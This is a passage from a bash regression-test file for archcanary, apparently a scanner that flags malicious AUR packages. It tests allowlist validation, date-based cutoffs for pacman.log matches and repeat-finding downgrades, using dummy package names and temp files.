        AUR_AUDIT_RED_LIST="$redlist" AUR_AUDIT_RED_DATES_LIST="$reddates" \
        AUR_AUDIT_RED_VERSIONS_LIST="$redversions" \
        AUR_AUDIT_BLACK_LIST="$blacklist" AUR_AUDIT_BLACK_DATES_LIST="$blackdates" \
        PACKAGE_LIST_FILE="$tmpdir/package_list.txt" \
        MALICIOUS_NPM_LIST="$tmpdir/malicious_npm.txt" \
        CHAOS_RAT_LIST="$tmpdir/chaos_rat.txt" \
        RUSSIAN_SPAM_LIST="$tmpdir/russian_spam.txt" \
        COMMUNITY_REPORTS_LIST="$tmpdir/community_reports.txt" \
        EXTRA_LISTS_CONF="$tmpdir/extra_lists.conf" \
        "$REPO_DIR/archcanary.sh" --refresh --no-notify --no-summary 2>&1) || true

    if [[ -f "$redversions" && ! -s "$redversions" ]]; then
        pass "_refresh_aur_audit: an empty versions capture clears stale prior data"
    else
        fail "_refresh_aur_audit: stale versions data survived an empty capture, content: $(cat "$redversions" 2>&1), out: $out"
    fi

    rm -rf "$tmpdir" "$fake_bin"
}

# ---------------------------------------------------------------------------
# _allowlist_cli value validation — regression coverage for the bug found
# 2026-08-02: the value regex required the first char to be alphanumeric
# and never allowed '/', so a real full-path autostart value (as required by
# check_autostart's unowned-ExecStart-binary allowlisting, added earlier the
# same day) was rejected outright with "invalid allowlist value" before ever
# reaching the root check. Neither the CLI verbs nor lib/archcanary-root-helper
# (which duplicates the same regex as the actual polkit privilege boundary)
# had any test coverage before this.
# ---------------------------------------------------------------------------
test_allowlist_cli() {
    local out rc

    # A: full-path autostart value must pass validation — run as the current
    # (non-root) user and assert the failure is the ROOT check, not
    # "invalid allowlist value". That proves validation let it through.
    local auto_file
    auto_file=$(mktemp)
    rc=0
    out=$(AUTOSTART_ALLOWLIST_FILE="$auto_file" \
        "$REPO_DIR/archcanary.sh" --allowlist-add=autostart:/usr/bin/mabox-logo 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"requires root"* && "$out" != *"invalid allowlist value"* ]]; then
        pass "allowlist_cli: full-path autostart value passes validation"
    else
        fail "allowlist_cli: full-path value wrongly rejected, rc=$rc, out: $out"
    fi

    # B: a bare name (the pre-existing dkms/systemd/bpftool case) must still
    # pass validation too — regression guard against the widened regex
    # accidentally breaking the original bare-name path.
    local dkms_file
    dkms_file=$(mktemp)
    rc=0
    out=$(DKMS_ALLOWLIST_FILE="$dkms_file" \
        "$REPO_DIR/archcanary.sh" --allowlist-add=dkms:v4l2loopback 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"requires root"* && "$out" != *"invalid allowlist value"* ]]; then
        pass "allowlist_cli: bare-name dkms value still passes validation"
    else
        fail "allowlist_cli: bare-name value wrongly rejected, rc=$rc, out: $out"
    fi
    rm -f "$dkms_file"

    # C: a value containing a space must still be rejected — the widened
    # regex must not have accidentally loosened validation beyond '/'.
    rc=0
    out=$(AUTOSTART_ALLOWLIST_FILE="$auto_file" \
        "$REPO_DIR/archcanary.sh" --allowlist-add="autostart:has space" 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"invalid allowlist value"* ]]; then
        pass "allowlist_cli: value with a space still rejected"
    else
        fail "allowlist_cli: value with a space should be rejected, rc=$rc, out: $out"
    fi

    # D: a value containing ':' must still be rejected (would get mis-split
    # by the IFS=: multi-value join when the file is later loaded).
    rc=0
    out=$(AUTOSTART_ALLOWLIST_FILE="$auto_file" \
        "$REPO_DIR/archcanary.sh" --allowlist-add="autostart:has:colon" 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"invalid allowlist value"* ]]; then
        pass "allowlist_cli: value with a colon still rejected"
    else
        fail "allowlist_cli: value with a colon should be rejected, rc=$rc, out: $out"
    fi

    rm -f "$auto_file"
}

# ---------------------------------------------------------------------------
# check_logs — per-source cutoff dates against known compromise windows.
# Regression coverage for a real report: python-future/clang15 (2023-2024
# installs) were flagged identically to a genuine recent match, even though
# the malicious-AUR campaign that put those names on the list didn't start
# until 2026-06. check_current's `pacman -Qmq` has no command override, so
# these fixture package names are only ever exercised as "not currently
# installed" (LOG_HIST/LOG_OLD) here — the currently-installed LOG_HIT
# branch is pre-existing, untouched-by-this-fix behavior with no override
# mechanism available today.
# ---------------------------------------------------------------------------
test_check_logs() {
    local tmpdir log_file pkglist chaoslist cache_home out rc

    tmpdir=$(mktemp -d)
    cache_home="$tmpdir/xdg-cache"
    log_file="$tmpdir/pacman.log"
    pkglist="$tmpdir/package_list.txt"
    chaoslist="$tmpdir/chaos_rat.txt"
    printf 'zzz-test-old-pkg\nzzz-test-new-pkg\n' > "$pkglist"
    printf 'zzz-test-chaos-old\nzzz-test-chaos-new\n' > "$chaoslist"

    cat > "$log_file" <<'EOF'
[2026-06-01T10:00:00-0600] [ALPM] installed zzz-test-old-pkg (1.0-1)
[2026-07-01T10:00:00-0600] [ALPM] installed zzz-test-new-pkg (1.0-1)
[2025-01-01T10:00:00-0600] [ALPM] installed zzz-test-chaos-old (1.0-1)
[2025-12-01T10:00:00-0600] [ALPM] installed zzz-test-chaos-new (1.0-1)
[1999-01-01T10:00:00-0600] [ALPM] installed zzz-test-community-ancient (1.0-1)
EOF

    local base_args=(
        --package-list="$pkglist"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --chaos-rat-list="$chaoslist"
        --no-notify
    )

    rc=0
    out=$(XDG_CACHE_HOME="$cache_home" PACMAN_LOG_GLOB="$log_file" \
        COMMUNITY_REPORTS_LIST="$tmpdir/community_reports.txt" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?

    # A: base-list entry before the campaign cutoff (2026-06-09) -> LOG_OLD
    if [[ "$out" == *"LOG_OLD: zzz-test-old-pkg"* ]]; then
        pass "check_logs: pre-cutoff base-list entry tagged LOG_OLD"
    else
        fail "check_logs: pre-cutoff base-list entry not tagged LOG_OLD, out: $out"
    fi

    # B: base-list entry after the campaign cutoff -> LOG_HIST (unchanged
    # existing behavior), confirming the boundary works both directions
    if [[ "$out" == *"LOG_HIST: zzz-test-new-pkg"* && "$out" != *"LOG_OLD: zzz-test-new-pkg"* ]]; then
        pass "check_logs: post-cutoff base-list entry still LOG_HIST"
    else
        fail "check_logs: post-cutoff base-list entry wrongly tagged, out: $out"
    fi

    # C: CHAOS RAT entry before ITS OWN cutoff (2025-07-22) -> LOG_OLD
    if [[ "$out" == *"LOG_OLD: zzz-test-chaos-old"* ]]; then
        pass "check_logs: pre-cutoff CHAOS RAT entry tagged LOG_OLD"
    else
        fail "check_logs: pre-cutoff CHAOS RAT entry not tagged LOG_OLD, out: $out"
    fi

    # D: CHAOS RAT entry after its own (earlier) cutoff but still well
    # before the base list's -> LOG_HIST, not LOG_OLD. Proves each source
    # compares against its own cutoff, not one shared global date -- a
    # base-list entry at this same date (2025-12-01) would be LOG_OLD.
    if [[ "$out" == *"LOG_HIST: zzz-test-chaos-new"* && "$out" != *"LOG_OLD: zzz-test-chaos-new"* ]]; then
        pass "check_logs: CHAOS RAT cutoff applied independently of base-list cutoff"
    else
        fail "check_logs: CHAOS RAT entry used the wrong cutoff, out: $out"
    fi

    # E: a source with no documented cutoff (Community Reports) is never
    # downgraded to LOG_OLD, no matter how old the date is
    rc=0
    printf 'zzz-test-community-ancient\n' > "$tmpdir/community_reports.txt"
    out=$(XDG_CACHE_HOME="$cache_home" PACMAN_LOG_GLOB="$log_file" \
        COMMUNITY_REPORTS_LIST="$tmpdir/community_reports.txt" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"LOG_HIST: zzz-test-community-ancient"*"[community report]"* && \
          "$out" != *"LOG_OLD: zzz-test-community-ancient"* ]]; then
        pass "check_logs: source with no documented cutoff (community report) never downgraded"
    else
        fail "check_logs: community-report entry wrongly downgraded to LOG_OLD, out: $out"
    fi

    # F: LOG_OLD is exit-code-neutral -- a scan with only pre-cutoff matches
    # (no LOG_HIT/LOG_HIST) still exits 0 and reports clean, unlike LOG_HIST
    local only_old_log="$tmpdir/pacman-old-only.log"
    printf '[2026-06-01T10:00:00-0600] [ALPM] installed zzz-test-old-pkg (1.0-1)\n' > "$only_old_log"
    rc=0
    out=$(XDG_CACHE_HOME="$cache_home" PACMAN_LOG_GLOB="$only_old_log" \
        COMMUNITY_REPORTS_LIST="$tmpdir/community_reports.txt" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" >/dev/null 2>&1) || rc=$?
    if [[ $rc -eq 0 ]]; then
        pass "check_logs: LOG_OLD-only scan is exit-code-neutral (exit 0)"
    else
        fail "check_logs: LOG_OLD-only scan should exit 0, got rc=$rc"
    fi

    # G-J: aur-audit black/red per-package cutoff (the flagged version's own
    # AUR publish date, captured into a companion "pkgname YYYY-MM-DD" dates
    # file on --refresh) -- regression coverage for a real report: a 2021
    # pacman.log entry for a package currently red-flagged got full
    # LOG_HIT/INFECTED severity, even though the red verdict gave no
    # indication the flagged behavior existed back in 2021. Unlike A-D above
    # (one fixed cutoff per source), aur-audit's cutoff is per-package.
    local audit_redlist audit_reddates audit_blacklist audit_blackdates audit_log
    audit_redlist="$tmpdir/aur_audit_red.txt"
    audit_reddates="$tmpdir/aur_audit_red_dates.txt"
    audit_blacklist="$tmpdir/aur_audit_black.txt"
    audit_blackdates="$tmpdir/aur_audit_black_dates.txt"
    audit_log="$tmpdir/pacman-audit.log"

    printf 'zzz-test-audit-red-old\nzzz-test-audit-red-new\nzzz-test-audit-red-nodate\n' > "$audit_redlist"
    printf 'zzz-test-audit-red-old 2026-07-01\nzzz-test-audit-red-new 2026-07-01\n' > "$audit_reddates"
    printf 'zzz-test-audit-black-old\n' > "$audit_blacklist"
    printf 'zzz-test-audit-black-old 2026-07-01\n' > "$audit_blackdates"
    cat > "$audit_log" <<'EOF'
[2026-06-01T10:00:00-0600] [ALPM] installed zzz-test-audit-red-old (1.0-1)
[2026-08-01T10:00:00-0600] [ALPM] installed zzz-test-audit-red-new (1.0-1)
[2026-06-01T10:00:00-0600] [ALPM] installed zzz-test-audit-black-old (1.0-1)
[1999-01-01T10:00:00-0600] [ALPM] installed zzz-test-audit-red-nodate (1.0-1)
EOF

    rc=0
    out=$(XDG_CACHE_HOME="$cache_home" PACMAN_LOG_GLOB="$audit_log" \
        COMMUNITY_REPORTS_LIST="$tmpdir/community_reports_empty.txt" \
        AUR_AUDIT_RED_LIST="$audit_redlist" AUR_AUDIT_RED_DATES_LIST="$audit_reddates" \
        AUR_AUDIT_BLACK_LIST="$audit_blacklist" AUR_AUDIT_BLACK_DATES_LIST="$audit_blackdates" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?

    # G: red entry before ITS package's own publish-date cutoff -> LOG_OLD
    if [[ "$out" == *"LOG_OLD: zzz-test-audit-red-old"*"[aur-audit: red]"* ]]; then
        pass "check_logs: aur-audit red entry before its own pubDateTs cutoff -> LOG_OLD"
    else
        fail "check_logs: expected LOG_OLD for pre-cutoff aur-audit red entry, out: $out"
    fi

    # H: red entry after its cutoff -> LOG_HIST, not LOG_OLD
    if [[ "$out" == *"LOG_HIST: zzz-test-audit-red-new"*"[aur-audit: red]"* && \
          "$out" != *"LOG_OLD: zzz-test-audit-red-new"* ]]; then
        pass "check_logs: aur-audit red entry after its own pubDateTs cutoff -> LOG_HIST"
    else
        fail "check_logs: expected LOG_HIST for post-cutoff aur-audit red entry, out: $out"
    fi

    # I: black entry before its cutoff -> LOG_OLD too (not just red)
    if [[ "$out" == *"LOG_OLD: zzz-test-audit-black-old"*"[aur-audit: black]"* ]]; then
        pass "check_logs: aur-audit black entry before its own pubDateTs cutoff -> LOG_OLD"
    else
        fail "check_logs: expected LOG_OLD for pre-cutoff aur-audit black entry, out: $out"
    fi

    # J: flagged package with NO entry in the dates file (e.g. not yet
    # re-refreshed since this feature shipped) -> no cutoff available, falls
    # back to the old "never downgrade" behavior even for an ancient date
    if [[ "$out" == *"LOG_HIST: zzz-test-audit-red-nodate"*"[aur-audit: red]"* && \
          "$out" != *"LOG_OLD: zzz-test-audit-red-nodate"* ]]; then
        pass "check_logs: aur-audit entry with no date on file falls back to no-cutoff"
    else
        fail "check_logs: expected no-cutoff fallback for date-less aur-audit entry, out: $out"
    fi

    rm -rf "$tmpdir"
}

# ---------------------------------------------------------------------------
# check_logs — LOG_HIST "seen once" downgrade. A historical (no-longer-
# installed) match only counts as a warning the first time; a repeat scan of
# the exact same install event prints LOG_HIST_SEEN instead and stays
# exit-code-neutral, while a genuinely new install of the same package name
# is still flagged fresh.
# ---------------------------------------------------------------------------
test_check_logs_seen_once() {
    local tmpdir log_file pkglist cache_home out rc

    tmpdir=$(mktemp -d)
    log_file="$tmpdir/pacman.log"
    pkglist="$tmpdir/package_list.txt"
    cache_home="$tmpdir/xdg-cache"
    printf 'zzz-test-seen-pkg\n' > "$pkglist"

    cat > "$log_file" <<'EOF'
[2026-07-01T10:00:00-0600] [ALPM] installed zzz-test-seen-pkg (1.0-1)
EOF

    local base_args=(
        --package-list="$pkglist"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --chaos-rat-list="$tmpdir/chaos_rat_empty.txt"
        --no-notify
    )

    # First run: fresh finding -> LOG_HIST, exit code reflects a warning.
    rc=0
    out=$(XDG_CACHE_HOME="$cache_home" PACMAN_LOG_GLOB="$log_file" \
        COMMUNITY_REPORTS_LIST="$tmpdir/community_reports_empty.txt" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"LOG_HIST: zzz-test-seen-pkg"* && $rc -ge 1 ]]; then
        pass "check_logs: first-time historical match tagged LOG_HIST and flagged"
    else
        fail "check_logs: expected first-run LOG_HIST + nonzero exit, out: $out rc=$rc"
    fi
    if [[ -s "$cache_home/archcanary/log_hist_seen.txt" ]]; then
        pass "check_logs: first run recorded the match in log_hist_seen.txt"
    else
        fail "check_logs: log_hist_seen.txt missing/empty after first run"
    fi

    # Second run, same log + same seen-file: downgraded to LOG_HIST_SEEN,
    # exit-code-neutral like LOG_OLD.
    rc=0
    out=$(XDG_CACHE_HOME="$cache_home" PACMAN_LOG_GLOB="$log_file" \
        COMMUNITY_REPORTS_LIST="$tmpdir/community_reports_empty.txt" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"LOG_HIST_SEEN: zzz-test-seen-pkg"* && "$out" != *"LOG_HIST: zzz-test-seen-pkg"* ]]; then
        pass "check_logs: repeat scan of the same event downgraded to LOG_HIST_SEEN"
    else
        fail "check_logs: expected LOG_HIST_SEEN on repeat scan, out: $out"
    fi
    if [[ $rc -eq 0 ]]; then
        pass "check_logs: LOG_HIST_SEEN-only scan is exit-code-neutral (exit 0)"
    else
        fail "check_logs: LOG_HIST_SEEN-only scan should exit 0, got rc=$rc"
    fi

    # A genuinely new install (different timestamp) of the same package name
    # is a distinct event -> fresh LOG_HIST, not silenced by the earlier one.
    cat > "$log_file" <<'EOF'
[2026-07-01T10:00:00-0600] [ALPM] installed zzz-test-seen-pkg (1.0-1)
[2026-08-01T10:00:00-0600] [ALPM] installed zzz-test-seen-pkg (2.0-1)
EOF
    rc=0
    out=$(XDG_CACHE_HOME="$cache_home" PACMAN_LOG_GLOB="$log_file" \
        COMMUNITY_REPORTS_LIST="$tmpdir/community_reports_empty.txt" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"LOG_HIST: zzz-test-seen-pkg (installed on 2026-08-01"* && \
          "$out" == *"LOG_HIST_SEEN: zzz-test-seen-pkg (installed on 2026-07-01"* ]]; then
        pass "check_logs: a new install event for the same name is flagged fresh"
    else
        fail "check_logs: new install event wrongly silenced by earlier seen entry, out: $out"
    fi

    rm -rf "$tmpdir"
}

# ---------------------------------------------------------------------------
# Run all tests
# ---------------------------------------------------------------------------
echo "=== Matching Tests ==="

$VERBOSE && msg ""

$VERBOSE && msg "--- Test 1: suffix_ambiguity ---"
test_suffix_ambiguity

$VERBOSE && msg "--- Test 2: substring ---"
test_substring

$VERBOSE && msg "--- Test 3: empty_list ---"
test_empty_list

$VERBOSE && msg "--- Test 4: comments_parsing ---"
test_comments_parsing

$VERBOSE && msg "--- Test 5: specials ---"
test_specials

$VERBOSE && msg "--- Test 6: cli_flag (--package-list) ---"
test_cli_flag

$VERBOSE && msg "--- Test 7: npm_cli_flag (--malicious-npm-list) ---"
test_npm_cli_flag

$VERBOSE && msg "--- Test 8: actual_list_integrity ---"
test_actual_list_integrity

$VERBOSE && msg "--- Test 9: check_ldso ---"
test_check_ldso

$VERBOSE && msg "--- Test 10: check_systemd hardened ---"
test_check_systemd_hardened

$VERBOSE && msg "--- Test 11: check_autostart ---"
test_check_autostart

$VERBOSE && msg "--- Test 12: pkgbuild_obfuscation ---"
test_pkgbuild_obfuscation

$VERBOSE && msg "--- Test 13: check_kmod ---"
test_check_kmod

$VERBOSE && msg "--- Test check_pkginteg: ELF vs non-binary classification ---"
test_check_pkginteg

$VERBOSE && msg "--- Test 14: check_bpftool allowlist ---"
test_check_bpftool_allowlist

$VERBOSE && msg "--- Test 15: bundled_list_path /usr/bin layout ---"
test_bundled_list_path_usr_bin_layout

$VERBOSE && msg "--- Test 16: allowlist_cli value validation ---"
test_allowlist_cli

$VERBOSE && msg "--- Test 17: RESULT banner skip-only wording ---"
test_result_banner_skip_only_wording

$VERBOSE && msg "--- Test 18: doctor stale bash completion detection ---"
test_doctor_stale_completion

$VERBOSE && msg "--- Test 19: doctor stale yay init.lua detection ---"
test_doctor_stale_yay_init

$VERBOSE && msg "--- Test 20: check_logs pre-campaign date correlation ---"
test_check_logs

$VERBOSE && msg "--- Test 21: doctor stale paru PreBuildCommand hook detection ---"
test_doctor_stale_paru_hook

$VERBOSE && msg "--- Test 22: install.sh paru.conf seed/uninstall logic ---"
test_install_paru_conf

$VERBOSE && msg "--- Test 23: --color flag validation ---"
test_color_flag_validation

$VERBOSE && msg "--- Test 24: enumerate_local_users filtering ---"
test_enumerate_local_users

$VERBOSE && msg "--- Test 25: scan-all-homes worst-of-N aggregation ---"
test_scan_all_homes_worst_of_n

$VERBOSE && msg "--- Test 26: scan-all-homes root guard ---"
test_scan_all_homes_root_guard

$VERBOSE && msg "--- Test 27: scan-all-homes flag wiring (--full exclusion) ---"
test_scan_all_homes_flag_wiring

$VERBOSE && msg "--- Test 28: _refresh_aur_audit RED versions companion file ---"
test_refresh_aur_audit_versions

$VERBOSE && msg "--- Test 29: _refresh_aur_audit clears stale versions data on empty capture ---"
test_refresh_aur_audit_versions_stale_clear

$VERBOSE && msg "--- Test 30: check_logs LOG_HIST seen-once downgrade ---"
test_check_logs_seen_once

$VERBOSE && msg "--- Test 31: scan-all-homes doesn't leak invoking user's list paths to other users ---"
test_scan_all_homes_no_cross_user_list_paths

$VERBOSE && msg "--- Test 32: root-install bundled lists are world-readable regardless of umask ---"
test_root_install_bundled_lists_world_readable

$VERBOSE && msg "--- Test 33: resolve_scan_user_opts (--scan-user resolution) ---"
test_resolve_scan_user_opts

$VERBOSE && msg "--- Test 34: --scan-user CLI flags (root guard, doctor, mutual exclusion) ---"
test_scan_user_cli_flags

$VERBOSE && msg "--- Test 35: --scan-user targets only the named users ---"
test_scan_user_targets_named_users_only

$VERBOSE && msg "--- Test 36: --scan-user per-user check-table rendering ---"
test_scan_user_per_user_checks

$VERBOSE && msg "--- Test 37: per-user summary scoped to --scan-user only ---"
test_scan_user_summary_scope

$VERBOSE && msg "--- Test 38: general checks still shown alongside --scan-user ---"
test_scan_user_general_check_still_shown

$VERBOSE && msg "--- Test 39: --scan-user flag-interaction NOTEs ---"
test_warn_scan_homes_flag_interactions

$VERBOSE && msg "--- Test 40: resolve_and_store_scan_users (early --scan-user validation) ---"
test_resolve_and_store_scan_users

$VERBOSE && msg "--- Test 41: --scan-user section header lists deduped names ---"
test_sah_section_header_deduped_names

echo "=== Results: $PASS_COUNT PASS, $FAIL_COUNT FAIL ==="
[[ $FAIL_COUNT -eq 0 ]] || exit 1
